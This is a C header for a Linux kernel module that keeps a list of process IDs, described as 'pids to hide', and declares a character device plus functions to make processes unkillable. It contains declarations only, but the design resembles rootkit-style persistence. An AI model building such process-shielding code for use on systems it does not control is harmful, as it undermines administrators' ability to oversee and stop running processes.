#pragma once

#include <linux/init.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/mutex.h>

#define DECIMAL_BASE (10)

struct proc_info {
    pid_t pid;
    struct list_head l_head;
};

// list of pids to hide.
extern struct list_head kunkillable_procs;

// register and unregister the char device.
int register_readpid_chrdev(const char* device_name);
void unregister_readpid_chrdev(int major_num, const char* device_name);

inline void make_process_killable(struct task_struct *ts);
inline void make_process_unkillable(struct task_struct *ts);
